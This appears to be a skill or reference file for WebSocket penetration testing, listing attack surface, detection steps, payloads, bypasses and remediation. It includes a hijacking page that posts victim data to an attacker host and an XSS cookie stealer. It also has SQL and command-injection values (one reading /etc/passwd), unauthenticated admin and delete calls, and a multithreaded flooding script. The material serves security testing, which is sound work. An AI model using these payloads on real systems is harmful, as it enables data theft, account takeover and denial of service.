---
name: websocket
description: WebSocket security testing including origin bypass, CSWSH, and message injection
---

# WebSocket Security

## Attack Surface

- Missing or weak Origin header validation enabling cross-site WebSocket hijacking
- No authentication on WebSocket handshake or per-message authorization
- Unvalidated message content allowing injection attacks
- Lack of rate limiting enabling DoS via high-frequency messages or large frames
- Sensitive data transmitted without encryption (ws:// instead of wss://)
- Insufficient input validation on server-side message handlers
- Missing CSRF protections on the initial HTTP upgrade request

## Detection Techniques

- Intercept WebSocket traffic with Burp Suite (WebSockets tab) or browser DevTools
- Check upgrade request for Origin validation: send from different origin
- Test handshake without cookies/tokens to verify authentication requirement
- Send malformed or oversized messages to test input validation
- Monitor for sensitive data in WebSocket frames (tokens, PII)
- Check if ws:// is used instead of wss:// (cleartext transmission)

## Common Payloads

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- Host this on attacker.com; victim visits while authenticated to target -->
<script>
var ws = new WebSocket("wss://target.com/ws");

// Victim's cookies are sent automatically with the handshake
ws.onopen = function() {
    // Read sensitive data
    ws.send(JSON.stringify({action: "get_profile"}));
    ws.send(JSON.stringify({action: "get_messages"}));
};

ws.onmessage = function(event) {
    // Exfiltrate data to attacker server
    fetch("https://attacker.com/collect", {
        method: "POST",
        body: event.data
    });
};
</script>
```

### Origin Bypass Techniques
```bash
# Test with no Origin header
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  https://target.com/ws

# Test with null Origin
# Origin: null (sent from sandboxed iframes, data: URIs)

# Test with subdomain matching bypass
# Origin: https://target.com.attacker.com
# Origin: https://attackertarget.com

# Test with scheme variation
# Origin: http://target.com (if server only checks domain, not scheme)
```

### Message Injection
```javascript
// If server reflects or processes messages without sanitization

// XSS via WebSocket message (if rendered in another client)
ws.send(JSON.stringify({
    message: "<img src=x onerror=alert(document.cookie)>"
}));

// SQL injection via WebSocket parameter
ws.send(JSON.stringify({
    action: "search",
    query: "' OR 1=1--"
}));

// Command injection if server executes message content
ws.send(JSON.stringify({
    action: "ping",
    host: "127.0.0.1; cat /etc/passwd"
}));

// IDOR via WebSocket: access other users' data
ws.send(JSON.stringify({
    action: "get_user",
    user_id: 1  // admin user
}));
```

### Authentication Bypass
```javascript
// Connect without authentication token
var ws = new WebSocket("wss://target.com/ws");

// Send privileged actions without prior auth
ws.onopen = function() {
    ws.send(JSON.stringify({action: "admin_list_users"}));
    ws.send(JSON.stringify({action: "delete_user", id: 123}));
};

// Test if auth is only checked on handshake, not per-message
// Authenticate, then send messages after token expires
```

### DoS via Large Frames
```python
import websocket

ws = websocket.create_connection("wss://target.com/ws")

# Send oversized message (test server limits)
ws.send("A" * 10_000_000)  # 10 MB payload

# Rapid message flooding
for i in range(100000):
    ws.send(f"flood message {i}")

# Open many concurrent connections
import threading
def connect():
    ws = websocket.create_connection("wss://target.com/ws")
    while True:
        ws.send("keepalive")

for _ in range(1000):
    threading.Thread(target=connect, daemon=True).start()
```

## Bypass Techniques

- Use `null` Origin from sandboxed iframe to bypass origin whitelist
- Exploit regex flaws in origin check: `target.com.evil.com` matches `target.com`
- Establish connection with valid token, then continue after session expires
- Send binary frames if server only validates text frame content
- Fragment payloads across multiple WebSocket frames to evade inspection

## Exploit Chaining

- CSWSH + sensitive data: hijack WebSocket to read private messages or account data
- Message injection + stored XSS: inject payload that renders in other clients' browsers
- Auth bypass + IDOR: access admin WebSocket channels without authentication
- WebSocket SSRF: if server fetches URLs from message content, pivot to internal services

## Remediation

- Validate Origin header strictly against an allowlist of trusted origins
- Require authentication token in the WebSocket handshake (query param or first message)
- Implement per-message authorization checks, not just at connection time
- Validate and sanitize all message content server-side before processing
- Set maximum message size and implement rate limiting per connection
- Use wss:// (TLS) exclusively; reject ws:// connections
- Implement CSRF tokens in the upgrade request where possible
- Set idle timeouts and maximum connection duration limits
